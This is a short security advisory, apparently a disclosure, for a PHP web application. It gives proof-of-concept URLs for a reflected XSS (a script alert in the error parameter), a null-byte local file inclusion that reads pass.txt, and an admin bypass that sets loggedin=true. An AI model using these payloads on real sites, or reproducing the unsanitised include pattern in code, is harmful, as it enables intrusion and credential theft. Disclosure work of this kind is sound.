2) Security Issues
-------------------

--- [ XSS ] ---
===============================================

I think that is better let you see a PoC instead of explain where is the bug.. If you want to know it just look at the
source code.

--- [ PoC ] ---
===============

http://localhost/ft/index.php?page=error&error=<b>...</b>
http://localhost/ft/index.php?page=error&error=<script>alert(1)</script>


--- [ Local File Inclusion ] ---
================================

Take a look in index.php, line 49:
include("$page.php");

Remembe that you have to log in to made local file inclusion (loggedin = true -> register_global = On)

[ Remembe that ]
if(!is_file($page . ".php") || (!is_readable($page . ".php"))) {
		$page = "error";
		$error = "Page does not exist or is not readable\n";
	}
}
[ /Remembe that ]

--- [ PoC ] ---
===============

http://localhost/ft/index.php?page=pass.txt%00&loggedin=true

To see pass.txt ...

--- [ Admin Bypass ] ---
================================

Today I'm too lazy to explain what's wrong.. so take a look in the source code and watch the var $loggedin !!

--- [ PoC ] ---
===============

To add a user...

http://localhost/ft/index.php?page=add&loggedin=true
